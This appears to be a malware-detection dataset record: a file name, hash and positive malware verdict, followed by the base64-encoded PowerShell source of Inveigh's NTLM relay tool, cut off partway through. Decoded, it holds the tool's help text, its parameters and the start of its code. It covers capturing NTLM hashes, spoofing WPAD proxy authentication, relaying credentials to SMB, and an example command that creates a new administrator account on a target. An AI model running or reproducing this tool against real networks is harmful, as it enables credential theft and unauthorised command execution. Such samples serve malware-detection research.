Invoke-InveighRelay.ps1,1b427981d41e0fc17a5c9415c2f552f8,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLUludmVpZ2hSZWxheQp7CjwjCi5TWU5PUFNJUwpJbnZva2UtSW52ZWlnaFJlbGF5IHBlcmZvcm1zIE5UTE12MiBIVFRQIHRvIFNNQiByZWxheSB3aXRoIHBzZXhlYyBzdHlsZSBjb21tYW5kIGV4ZWN1dGlvbi4KCi5ERVNDUklQVElPTgpJbnZva2UtSW52ZWlnaFJlbGF5IGN1cnJlbnRseSBzdXBwb3J0cyBOVExNdjIgSFRUUCB0byBTTUIxL1NNQjIgcmVsYXkgd2l0aCBwc2V4ZWMgc3R5bGUgY29tbWFuZCBleGVjdXRpb24uCgogICAgSFRUUC9IVFRQUyB0byBTTUIgTlRMTXYyIHJlbGF5IHdpdGggZ3JhbnVsYXIgY29udHJvbAogICAgU3VwcG9ydHMgU01CMSBhbmQgU01CMiB0YXJnZXRzCiAgICBEb2VzIG5vdCByZXF1aXJlIHByaXZlbGVnZWQgYWNjZXNzIG9uIHRoZSBJbnZva2UtSW52ZWlnaFJlbGF5IGhvc3QKICAgIFRoZSBJbnZva2UtSW52ZWlnaFJlbGF5IGhvc3QgY2FuIGJlIHRhcmdldGVkIGZvciBwcml2aWxlZ2UgZXNjYWxhdGlvbgogICAgTlRMTXYxL05UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZSBvdmVyIEhUVFAvSFRUUFMKICAgIEdyYW51bGFyIGNvbnRyb2wgb2YgY29uc29sZSBhbmQgZmlsZSBvdXRwdXQKCi5QQVJBTUVURVIgQ2hhbGxlbmdlCkRlZmF1bHQgPSBSYW5kb206IDE2IGNoYXJhY3RlciBoZXggTlRMTSBjaGFsbGVuZ2UgZm9yIHVzZSB3aXRoIHRoZSBIVFRQIGxpc3RlbmVyLiBJZiBsZWZ0IGJsYW5rLCBhIHJhbmRvbQpjaGFsbGVuZ2Ugd2lsbCBiZSBnZW5lcmF0ZWQgZm9yIGVhY2ggcmVxdWVzdC4gTm90ZSB0aGF0IGR1cmluZyBTTUIgcmVsYXkgYXR0ZW1wdHMsIHRoZSBjaGFsbGVuZ2Ugd2lsbCBiZQpwdWxsZWQgZnJvbSB0aGUgU01CIHJlbGF5IHRhcmdldC4gCgouUEFSQU1FVEVSIENvbW1hbmQKQ29tbWFuZCB0byBleGVjdXRlIG9uIFNNQiByZWxheSB0YXJnZXQuIFVzZSBQb3dlclNoZWxsIGNoYXJhY3RlciBlc2NhcGVzIHdoZXJlIG5lY2Vzc2FyeS4KCi5QQVJBTUVURVIgQ29uc29sZU91dHB1dApEZWZhdWx0ID0gRGlzYWJsZWQ6IChMb3cvTWVkaXVtL1kvTikgRW5hYmxlL0Rpc2FibGUgcmVhbCB0aW1lIGNvbnNvbGUgb3V0cHV0LiBJZiB1c2luZyB0aGlzIG9wdGlvbiB0aHJvdWdoIGEKc2hlbGwsIHRlc3QgdG8gZW5zdXJlIHRoYXQgaXQgZG9lc24ndCBoYW5nIHRoZSBzaGVsbC4gTWVkaXVtIGFuZCBMb3cgY2FuIGJlIHVzZWQgdG8gcmVkdWNlIG91dHB1dC4KCi5QQVJBTUVURVIgQ29uc29sZVF1ZXVlTGltaXQKRGVmYXVsdCA9IFVubGltaXRlZDogTWF4aW11bSBudW1iZXIgb2YgcXVldWVkIHVwIGNvbnNvbGUgbG9nIGVudHJpZXMgd2hlbiBub3QgdXNpbmcgdGhlIHJlYWwgdGltZSBjb25zb2xlLgoKLlBBUkFNRVRFUiBDb25zb2xlU3RhdHVzCihJbnRlZ2VyKSBJbnRlcnZhbCBpbiBtaW51dGVzIGZvciBkaXNwbGF5aW5nIGFsbCB1bmlxdWUgY2FwdHVyZWQgaGFzaGVzIGFuZCBjcmVkZW50aWFscy4gVGhpcyBpcyB1c2VmdWwgZm9yCmRpc3BsYXlpbmcgZnVsbCBjYXB0dXJlIGxpc3RzIHdoZW4gcnVubmluZyB0aHJvdWdoIGEgc2hlbGwgdGhhdCBkb2VzIG5vdCBoYXZlIGFjY2VzcyB0byB0aGUgc3VwcG9ydCBmdW5jdGlvbnMuCgouUEFSQU1FVEVSIENvbnNvbGVVbmlxdWUKRGVmYXVsdCA9IEVuYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIGRpc3BsYXlpbmcgY2hhbGxlbmdlL3Jlc3BvbnNlIGhhc2hlcyBmb3Igb25seSB1bmlxdWUgSVAsIGRvbWFpbi9ob3N0bmFtZSwKYW5kIHVzZXJuYW1lIGNvbWJpbmF0aW9ucyB3aGVuIHJlYWwgdGltZSBjb25zb2xlIG91dHB1dCBpcyBlbmFibGVkLgoKLlBBUkFNRVRFUiBGaWxlT3V0cHV0CkRlZmF1bHQgPSBEaXNhYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgcmVhbCB0aW1lIGZpbGUgb3V0cHV0LgoKLlBBUkFNRVRFUiBGaWxlT3V0cHV0RGlyZWN0b3J5CkRlZmF1bHQgPSBXb3JraW5nIERpcmVjdG9yeTogVmFsaWQgcGF0aCB0byBhbiBvdXRwdXQgZGlyZWN0b3J5IGZvciBsb2cgYW5kIGNhcHR1cmUgZmlsZXMuIEZpbGVPdXRwdXQgbXVzdCBhbHNvIGJlCmVuYWJsZWQuCgouUEFSQU1FVEVSIEhUVFAKRGVmYXVsdCA9IEVuYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIEhUVFAgY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmUuCgouUEFSQU1FVEVSIEhUVFBJUApEZWZhdWx0ID0gQW55OiBJUCBhZGRyZXNzIGZvciB0aGUgSFRUUC9IVFRQUyBsaXN0ZW5lci4KCi5QQVJBTUVURVIgSFRUUFBvcnQKRGVmYXVsdCA9IDgwOiBUQ1AgcG9ydCBmb3IgdGhlIEhUVFAgbGlzdGVuZXIuCgouUEFSQU1FVEVSIEhUVFBTCkRlZmF1bHQgPSBEaXNhYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgSFRUUFMgY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmUuIFdhcm5pbmcsIGEgY2VydCB3aWxsIGJlIGluc3RhbGxlZCBpbgp0aGUgbG9jYWwgc3RvcmUuIElmIHRoZSBzY3JpcHQgZG9lcyBub3QgZXhpdCBncmFjZWZ1bGx5LCBtYW51YWxseSByZW1vdmUgdGhlIGNlcnRpZmljYXRlLiBUaGlzIGZlYXR1cmUgcmVxdWlyZXMKbG9jYWwgYWRtaW5pc3RyYXRvciBhY2Nlc3MuCgouUEFSQU1FVEVSIEhUVFBTUG9ydApEZWZhdWx0ID0gNDQzOiBUQ1AgcG9ydCBmb3IgdGhlIEhUVFBTIGxpc3RlbmVyLgoKLlBBUkFNRVRFUiBIVFRQU0NlcnRJc3N1ZXIKRGVmYXVsdCA9IEludmVpZ2g6IFRoZSBpc3N1ZXIgZmllbGQgZm9yIHRoZSBjZXJ0IHRoYXQgd2lsbCBiZSBpbnN0YWxsZWQgZm9yIEhUVFBTLgoKLlBBUkFNRVRFUiBIVFRQU0NlcnRTdWJqZWN0CkRlZmF1bHQgPSBsb2NhbGhvc3Q6IFRoZSBzdWJqZWN0IGZpZWxkIGZvciB0aGUgY2VydCB0aGF0IHdpbGwgYmUgaW5zdGFsbGVkIGZvciBIVFRQUy4KCi5QQVJBTUVURVIgSFRUUFNGb3JjZUNlcnREZWxldGUKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBGb3JjZSBkZWxldGlvbiBvZiBhbiBleGlzdGluZyBjZXJ0aWZpY2F0ZSB0aGF0IG1hdGNoZXMgSFRUUFNDZXJ0SXNzdWVyIGFuZApIVFRQU0NlcnRTdWJqZWN0LgoKLlBBUkFNRVRFUiBIVFRQUmVzZXREZWxheQpEZWZhdWx0ID0gRmlyZWZveDogQ29tbWEgc2VwYXJhdGVkIGxpc3Qgb2Yga2V5d29yZHMgdG8gdXNlIGZvciBmaWx0ZXJpbmcgYnJvd3NlciB1c2VyIGFnZW50cy4gTWF0Y2hpbmcgYnJvd3NlcnMKd2lsbCBoYXZlIGEgZGVsYXkgYmVmb3JlIHRoZWlyIGNvbm5lY3Rpb25zIGFyZSByZXNldCB3aGVuIEludmVpZ2ggZG9lc24ndCByZWNlaXZlIGRhdGEuIFRoaXMgY2FuIGluY3JlYXNlIHRoZQpjaGFuY2Ugb2YgY2FwdHVyaW5nL3JlbGF5aW5nIGF1dGhlbnRpY2F0aW9uIHRocm91Z2ggYSBwb3B1cCBib3ggd2l0aCBzb21lIGJyb3dzZXJzIChGaXJlZm94KS4KCi5QQVJBTUVURVIgSFRUUFJlc2V0RGVsYXlUaW1lb3V0CkRlZmF1bHQgPSAzMCBTZWNvbmRzOiBIVFRQUmVzZXREZWxheSB0aW1lb3V0IGluIHNlY29uZHMuCgouUEFSQU1FVEVSIExvZ091dHB1dApEZWZhdWx0ID0gRW5hYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgc3RvcmluZyBsb2cgbWVzc2FnZXMgaW4gbWVtb3J5LgoKLlBBUkFNRVRFUiBNYWNoaW5lQWNjb3VudHMKRGVmYXVsdCA9IERpc2FibGVkOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBzaG93aW5nIE5UTE0gY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVzIGZyb20gbWFjaGluZSBhY2NvdW50cy4KCi5QQVJBTUVURVIgT3V0cHV0U3RyZWFtT25seQpEZWZhdWx0ID0gRGlzYWJsZWQ6IEVuYWJsZS9EaXNhYmxlIGZvcmNpbmcgYWxsIG91dHB1dCB0byB0aGUgc3RhbmRhcmQgb3V0cHV0IHN0cmVhbS4gVGhpcyBjYW4gYmUgaGVscGZ1bCBpZgpydW5uaW5nIEludmVpZ2ggUmVsYXkgdGhyb3VnaCBhIHNoZWxsIHRoYXQgZG9lcyBub3QgcmV0dXJuIG90aGVyIG91dHB1dCBzdHJlYW1zLiBOb3RlIHRoYXQgeW91IHdpbGwgbm90IHNlZSB0aGUKdmFyaW91cyB5ZWxsb3cgd2FybmluZyBtZXNzYWdlcyBpZiBlbmFibGVkLgoKLlBBUkFNRVRFUiBQcm94eVJlbGF5CkRlZmF1bHQgPSBEaXNhYmxlZDogKFkvTik6IEVuYWJsZS9EaXNhYmxlIHJlbGF5aW5nIHByb3h5IGF1dGhlbnRpY2F0aW9uLgoKLlBBUkFNRVRFUiBQcm94eUlQCkRlZmF1bHQgPSBBbnk6IElQIGFkZHJlc3MgZm9yIHRoZSBwcm94eSBsaXN0ZW5lci4KCi5QQVJBTUVURVIgUHJveHlQb3J0CkRlZmF1bHQgPSA4MTgyOiBUQ1AgcG9ydCBmb3IgdGhlIHByb3h5IGxpc3RlbmVyLgoKLlBBUkFNRVRFUiBQcm94eUlnbm9yZQpEZWZhdWx0ID0gRmlyZWZveDogQ29tbWEgc2VwYXJhdGVkIGxpc3Qgb2Yga2V5d29yZHMgdG8gdXNlIGZvciBmaWx0ZXJpbmcgYnJvd3NlciB1c2VyIGFnZW50cy4gTWF0Y2hpbmcgYnJvd3NlcnMKd2lsbCBub3QgYmUgc2VudCB0aGUgd3BhZC5kYXQgZmlsZSB1c2VkIGZvciBjYXB0dXJpbmcgcHJveHkgYXV0aGVudGljYXRpb25zLiBGaXJlZm94IGRvZXMgbm90IHdvcmsgY29ycmVjdGx5CndpdGggdGhlIHByb3h5IHNlcnZlciBmYWlsb3ZlciBzZXR1cC4gRmlyZWZveCB3aWxsIGJlIGxlZnQgdW5hYmxlIHRvIGNvbm5lY3QgdG8gYW55IHNpdGVzIHVudGlsIHRoZSBwcm94eSBpcwpjbGVhcmVkLiBSZW1vdmUgIkZpcmVmb3giIGZyb20gdGhpcyBsaXN0IHRvIGF0dGFjayBGaXJlZm94LiBJZiBhdHRhY2tpbmcgRmlyZWZveCwgY29uc2lkZXIgc2V0dGluZwotU3Bvb2ZlclJlcGVhdCBOIHRvIGxpbWl0IGF0dGFja3MgYWdhaW5zdCBhIHNpbmdsZSB0YXJnZXQgc28gdGhhdCB2aWN0aW1zIGNhbiByZWNvdmVyIEZpcmVmb3ggY29ubmVjdGl2aXR5IGJ5CmNsb3NpbmcgYW5kIHJlb3BlbmluZy4KCi5QQVJBTUVURVIgUmVsYXlBdXRvRGlzYWJsZQpEZWZhdWx0ID0gRW5hYmxlOiAoWS9OKSBFbmFibGUvRGlzYWJsZSBhdXRvbWF0aWNhbHkgZGlzYWJsaW5nIFNNQiByZWxheSBhZnRlciBhIHN1Y2Nlc3NmdWwgY29tbWFuZCBleGVjdXRpb24gb24KdGFyZ2V0LgoKLlBBUkFNRVRFUiBSZWxheUF1dG9FeGl0CkRlZmF1bHQgPSBFbmFibGU6IChZL04pIEVuYWJsZS9EaXNhYmxlIGF1dG9tYXRpY2FseSBleGl0aW5nIGFmdGVyIGEgcmVsYXkgaXMgZGlzYWJsZWQgZHVlIHRvIHN1Y2Nlc3Mgb3IgZXJyb3IuCgouUEFSQU1FVEVSIFJ1blRpbWUKKEludGVnZXIpIFJ1biB0aW1lIGR1cmF0aW9uIGluIG1pbnV0ZXMuCgouUEFSQU1FVEVSIFNlcnZpY2UKRGVmYXVsdCA9IDIwIENoYXJhY3RlciBSYW5kb206IE5hbWUgb2YgdGhlIHNlcnZpY2UgdG8gY3JlYXRlIGFuZCBkZWxldGUgb24gdGhlIHRhcmdldC4KCi5QQVJBTUVURVIgU2hvd0hlbHAKRGVmYXVsdCA9IEVuYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIHRoZSBoZWxwIG1lc3NhZ2VzIGF0IHN0YXJ0dXAuCgouUEFSQU1FVEVSIFNNQjEKKFN3aXRjaCkgRm9yY2UgU01CMS4gVGhlIGRlZmF1bHQgYmVoYXZpb3IgaXMgdG8gcGVyZm9ybSBTTUIgdmVyc2lvbiBuZWdvdGlhdGlvbiBhbmQgdXNlIFNNQjIgaWYgc3VwcG9ydGVkIGJ5IHRoZQp0YXJnZXQuCgouUEFSQU1FVEVSIFN0YXJ0dXBDaGVja3MKRGVmYXVsdCA9IEVuYWJsZWQ6IChZL04pIEVuYWJsZS9EaXNhYmxlIGNoZWNrcyBmb3IgaW4gdXNlIHBvcnRzIGFuZCBydW5uaW5nIHNlcnZpY2VzIG9uIHN0YXJ0dXAuCgouUEFSQU1FVEVSIFN0YXR1c091dHB1dApEZWZhdWx0ID0gRW5hYmxlZDogKFkvTikgRW5hYmxlL0Rpc2FibGUgc3RhcnR1cCBhbmQgc2h1dGRvd24gbWVzc2FnZXMuCgouUEFSQU1FVEVSIFRhcmdldApJUCBhZGRyZXNzIG9mIHN5c3RlbSB0byB0YXJnZXQgZm9yIFNNQiByZWxheS4KCi5QQVJBTUVURVIgVG9vbApEZWZhdWx0ID0gMDogKDAvMS8yKSBFbmFibGUvRGlzYWJsZSBmZWF0dXJlcyBmb3IgYmV0dGVyIG9wZXJhdGlvbiB0aHJvdWdoIGV4dGVybmFsIHRvb2xzIHN1Y2ggYXMgTWV0ZXJwcmV0ZXIncwpQb3dlclNoZWxsIGV4dGVuc2lvbiwgTWV0YXNwbG9pdCdzIEludGVyYWN0aXZlIFBvd2VyU2hlbGwgU2Vzc2lvbnMgcGF5bG9hZHMgYW5kIEVtcGlyZS4KMCA9IE5vbmUsIDEgPSBNZXRhc3Bsb2l0L01ldGVycHJldGVyLCAyID0gRW1waXJlIAoKLlBBUkFNRVRFUiBVc2VybmFtZXMKRGVmYXVsdCA9IEFsbCBVc2VybmFtZXM6IENvbW1hIHNlcGFyYXRlZCBsaXN0IG9mIHVzZXJuYW1lcyB0byB1c2UgZm9yIHJlbGF5IGF0dGFja3MuIEFjY2VwdHMgYm90aCB1c2VybmFtZSBhbmQKZG9tYWluXHVzZXJuYW1lIGZvcm1hdC4gCgouUEFSQU1FVEVSIFdQQURBdXRoCkRlZmF1bHQgPSBOVExNOiAoQW5vbnltb3VzL05UTE0pIEhUVFAvSFRUUFMgc2VydmVyIGF1dGhlbnRpY2F0aW9uIHR5cGUgZm9yIHdwYWQuZGF0IHJlcXVlc3RzLiBTZXR0aW5nIHRvCkFub255bW91cyBjYW4gcHJldmVudCBicm93c2VyIGxvZ2luIHByb21wdHMuCgouUEFSQU1FVEVSIFdQQURBdXRoSWdub3JlCkRlZmF1bHQgPSBGaXJlZm94OiBDb21tYSBzZXBhcmF0ZWQgbGlzdCBvZiBrZXl3b3JkcyB0byB1c2UgZm9yIGZpbHRlcmluZyBicm93c2VyIHVzZXIgYWdlbnRzLiBNYXRjaGluZyBicm93c2Vycwp3aWxsIGJlIHNraXBwZWQgZm9yIE5UTE0gYXV0aGVudGljYXRpb24uIFRoaXMgY2FuIGJlIHVzZWQgdG8gZmlsdGVyIG91dCBicm93c2VycyBsaWtlIEZpcmVmb3ggdGhhdCBkaXNwbGF5IGxvZ2luCnBvcHVwcyBmb3IgYXV0aGVudGljYXRlZCB3cGFkLmRhdCByZXF1ZXN0cyBzdWNoIGFzIEZpcmVmb3guICAKCi5FWEFNUExFCkludm9rZS1JbnZlaWdoIC1IVFRQIE4KSW52b2tlLUludmVpZ2hSZWxheSAtVGFyZ2V0IDE5Mi4xNjguMi41NSAtQ29tbWFuZCAibmV0IHVzZXIgSW52ZWlnaCBTcHJpbmcyMDE3IC9hZGQgJiYgbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgSW52ZWlnaCAvYWRkIgoKLkxJTksKaHR0cHM6Ly9naXRodWIuY29tL0tldmluLVJvYmVydHNvbi9JbnZlaWdoCiM+CgojIFBhcmFtZXRlciBkZWZhdWx0IHZhbHVlcyBjYW4gYmUgbW9kaWZpZWQgaW4gdGhpcyBzZWN0aW9uOgpbQ21kbGV0QmluZGluZygpXQpwYXJhbQooIAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bQXJyYXldJEhUVFBSZXNldERlbGF5ID0gIkZpcmVmb3giLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bQXJyYXldJFByb3h5SWdub3JlID0gIkZpcmVmb3giLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bQXJyYXldJFVzZXJuYW1lcyA9ICIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bQXJyYXldJFdQQURBdXRoSWdub3JlID0gIiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtJbnRdJENvbnNvbGVRdWV1ZUxpbWl0ID0gIi0xIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW0ludF0kQ29uc29sZVN0YXR1cyA9ICIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bSW50XSRIVFRQUG9ydCA9ICI4MCIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtJbnRdJEhUVFBTUG9ydCA9ICI0NDMiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bSW50XSRIVFRQUmVzZXREZWxheVRpbWVvdXQgPSAiMzAiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bSW50XSRQcm94eVBvcnQgPSAiODQ5MiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtJbnRdJFJ1blRpbWUgPSAiIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV1bU3RyaW5nXSRDb21tYW5kID0gIiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtTdHJpbmddJEhUVFBTQ2VydElzc3VlciA9ICJJbnZlaWdoIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N0cmluZ10kSFRUUFNDZXJ0U3ViamVjdCA9ICJsb2NhbGhvc3QiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3RyaW5nXSRTZXJ2aWNlLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUpXVtTdHJpbmddJFRhcmdldCA9ICIiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kQ29uc29sZVVuaXF1ZSA9ICJZIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJEZpbGVPdXRwdXQgPSAiTiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRIVFRQID0gIlkiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kSFRUUFMgPSAiTiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRIVFRQU0ZvcmNlQ2VydERlbGV0ZSA9ICJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJExvZ091dHB1dCA9ICJZIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJE1hY2hpbmVBY2NvdW50cyA9ICJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJE91dHB1dFN0cmVhbU9ubHkgPSAiTiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRQcm94eSA9ICJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCJZIiwiTiIpXVtTdHJpbmddJFJlbGF5QXV0b0Rpc2FibGUgPSAiWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRSZWxheUF1dG9FeGl0ID0gIlkiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kU2hvd0hlbHAgPSAiWSIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNldCgiWSIsIk4iKV1bU3RyaW5nXSRTdGFydHVwQ2hlY2tzID0gIlkiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIildW1N0cmluZ10kU3RhdHVzT3V0cHV0ID0gIlkiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIlkiLCJOIiwiTG93IiwiTWVkaXVtIildW1N0cmluZ10kQ29uc29sZU91dHB1dCA9ICJOIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2V0KCIwIiwiMSIsIjIiKV1bU3RyaW5nXSRUb29sID0gIjAiLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bVmFsaWRhdGVTZXQoIkFub255bW91cyIsIk5UTE0iKV1bU3RyaW5nXSRXUEFEQXV0aCA9ICJOVExNIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2NyaXB0KHtUZXN0LVBhdGggJF99KV1bU3RyaW5nXSRGaWxlT3V0cHV0RGlyZWN0b3J5ID0gIiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVBhdHRlcm4oJ15bQS1GYS1mMC05XXsxNn0kJyldW1N0cmluZ10kQ2hhbGxlbmdlID0gIiIsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtTd2l0Y2hdJFNNQjEsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtWYWxpZGF0ZVNjcmlwdCh7JF8gLW1hdGNoIFtTeXN0ZW0uTmV0LklQQWRkcmVzc10kX30pXVtTdHJpbmddJEhUVFBJUCA9ICIwLjAuMC4wIiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1ZhbGlkYXRlU2NyaXB0KHskXyAtbWF0Y2ggW1N5c3RlbS5OZXQuSVBBZGRyZXNzXSRffSldW1N0cmluZ10kUHJveHlJUCA9ICIwLjAuMC4wIiwKICAgIFtwYXJhbWV0ZXIoVmFsdWVGcm9tUmVtYWluaW5nQXJndW1lbnRzPSR0cnVlKV0kaW52YWxpZF9wYXJhbWV0ZXIKKQoKaWYgKCRpbnZhbGlkX3BhcmFtZXRlcikKewogICAgV3JpdGUtT3V0cHV0ICJFcnJvcjokKCRpbnZhbGlkX3BhcmFtZXRlcikgaXMgbm90IGEgdmFsaWQgcGFyYW1ldGVyLiIKICAgIHRocm93Cn0KCiRpbnZlaWdoX3ZlcnNpb24gPSAiMS4zIgoKaWYoJFByb3h5SVAgLWVxICcwLjAuMC4wJykKeyAKICAgICRwcm94eV9XUEFEX0lQID0gKFRlc3QtQ29ubmVjdGlvbiAxMjcuMC4wLjEgLWNvdW50IDEgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBJcHY0QWRkcmVzcykKfQoKaWYoISRGaWxlT3V0cHV0RGlyZWN0b3J5KQp7IAogICAgJG91dHB1dF9kaXJlY3RvcnkgPSAkUFdELlBhdGgKfQplbHNlCnsKICAgICRvdXRwdXRfZGlyZWN0b3J5ID0gJEZpbGVPdXRwdXREaXJlY3RvcnkKfQoKaWYoISRpbnZlaWdoKQp7CiAgICAkZ2xvYmFsOmludmVpZ2ggPSBbSGFzaFRhYmxlXTo6U3luY2hyb25pemVkKEB7fSkKICAgICRpbnZlaWdoLmNsZWFydGV4dF9saXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLmxvZyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guTlRMTXYxX2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLk5UTE12MV91c2VybmFtZV9saXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5OVExNdjJfbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guTlRMTXYyX3VzZXJuYW1lX2xpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLlBPU1RfcmVxdWVzdF9saXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5TTUJSZWxheV9mYWlsZWRfbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2gudmFsaWRfaG9zdF9saXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0Cn0KCmlmKCRpbnZlaWdoLnJlbGF5X3J1bm5pbmcpCnsKICAgIFdyaXRlLU91dHB1dCAiRXJyb3I6SW52b2tlLUludmVpZ2hSZWxheSBpcyBhbHJlYWR5IHJ1bm5pbmcsIHVzZSBTdG9wLUludmVpZ2giCiAgICB0aHJvdwp9CgppZighJGludmVpZ2gucnVubmluZykKewogICAgJGludmVpZ2guY2xlYXJ0ZXh0X2ZpbGVfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLkhUVFBfY2hhbGxlbmdlX3F1ZXVlID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAogICAgJGludmVpZ2guTlRMTXYxX2ZpbGVfcXVldWUgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKICAgICRpbnZlaWdoLk5UTE12Ml9maWx